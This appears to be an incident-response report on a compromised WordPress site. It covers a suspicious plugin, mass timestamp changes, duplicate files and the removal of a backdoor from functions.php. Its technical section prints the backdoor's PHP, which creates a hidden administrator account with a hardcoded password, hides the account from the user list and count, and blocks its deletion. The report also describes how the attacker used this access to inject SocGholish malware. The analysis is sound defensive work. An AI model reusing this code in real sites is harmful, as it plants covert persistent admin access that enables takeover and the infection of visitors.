**Status:** 🔍 INVESTIGATED
```
Plugin Name: hhqheao (random 7-char name - SUSPICIOUS)
Actual Plugin: "Protect Uploads" by Alexis Blondin
Status: INACTIVE
Location: NOT FOUND (may have been deleted)
```

**Analysis:**
- Random directory name is suspicious
- Plugin itself appears legitimate
- Currently not installed/active

**Verdict:** ⚠️ Monitor - plugin may have been removed during cleanup

---

## 🎯 Critical Discoveries

### 1. **INCOMPLETE BACKDOOR REMOVAL** ✅ FIXED

**Problem:** Initial cleanup only removed 51 lines, but **32 more lines** of backdoor code remained!

**Remaining Code:**
- Lines 3646-3677: User hiding & protection functions
- `wp_admin_users_protect_user_query()` - Hides user from admin list
- `protect_user_count()` - Hides user count
- `_pre_user_id` references - Hidden user ID storage

**Actions Taken:**
```
✅ Identified all backdoor code (total 83 lines)
✅ Removed lines 3646-3677 from SERVER functions.php
✅ Removed lines 3646-3676 from LOCAL functions.php
✅ Verified no _pre_user_id references remain
✅ Tested WordPress - no errors
✅ Verified "root" user does not exist
```

**Result:** Backdoor **COMPLETELY REMOVED** from both server and local

---

### 2. **Mass File Timestamp Changes** ⚠️

**Finding:** 20+ PHP files modified at **Oct 28, 06:02 AM** - same time as backdoor

**Possible Causes:**
1. Backup/restore operation touched all files
2. Attacker accessed multiple files
3. File system operation (chmod, chown, etc.)

**Analysis:**
- No malicious code found in these files
- Likely from backup restoration
- Not individual infections

**Verdict:** ⚠️ Suspicious timing but files are clean

---

### 3. **Suspicious Duplicate Files** ⚠️

**Finding:** 18 files with " 2.php" pattern (space before 2)

**Investigation:**
- No backdoor code found in duplicates
- Likely macOS backup copies (Finder creates " 2" copies)
- All files are older versions or backups

**Verdict:** ✅ Clean but should be removed to reduce confusion

---

## 🔐 Backdoor Technical Analysis

### How It Worked

**1. Auto-Creation (Every Page Load):**
```php
if (!username_exists('root')) {
    wp_insert_user([
        'user_login' => 'root',
        'user_pass' => 'Zb{0@U{vsFjq&#j(<?L[Iy0Hi_#9]i-LlJN0=Ec',
        'role' => 'administrator'
    ]);
}
```
- Created "root" admin on every WordPress page load
- If deleted, instantly recreated
- Password: `Zb{0@U{vsFjq&#j(<?L[Iy0Hi_#9]i-LlJN0=Ec`

**2. User Hiding (From Admin List):**
```php
function wp_admin_users_protect_user_query($user_search) {
    $id = get_option('_pre_user_id');
    $user_search->query_where = str_replace('WHERE 1=1',
        "WHERE {$id}={$id} AND {$wpdb->users}.ID<>{$id}",
        $user_search->query_where
    );
}
```
- Modified WordPress user query
- Excluded "root" user from admin list
- Invisible to administrators

**3. Count Hiding (Admin User Count):**
```php
function protect_user_count($views) {
    $count[0]--;  // Reduce count by 1
    $views['all'] = $html[0] . '<span class="count">(' . $count[0] . ')</span>';
}
```
- Decreased displayed user count by 1
- Hid the extra admin account
- Made "root" user completely invisible

**4. Deletion Protection:**
```php
function protect_user_from_deleting() {
    if ($_GET['action'] == 'delete' && $_GET['user'] == $id) {
        wp_die(__('Invalid user ID.'));
    }
}
```
- Prevented deletion of "root" user
- Showed error if deletion attempted
- Made backdoor persistent

## 🎯 Attack Vector Analysis

### How Attacker Used This Backdoor

**Step 1:** Any page load → Backdoor creates "root" user
**Step 2:** Attacker logs in as "root" (password known)
**Step 3:** Goes to Appearance → Theme File Editor
**Step 4:** Edits main.js → Injects SocGholish malware
**Step 5:** Saves file → Visitors get infected
**Step 6:** Logs out → Completely invisible

**Why We Kept Getting Reinfected:**
1. We cleaned malware ✅
2. We deleted "root" user ✅
3. Next page load → Backdoor recreated "root" ❌
4. Attacker logs back in ❌
5. Deploys new malware ❌
6. Cycle repeats ❌

**Now:** Backdoor removed → Cycle broken → Attacker locked out ✅
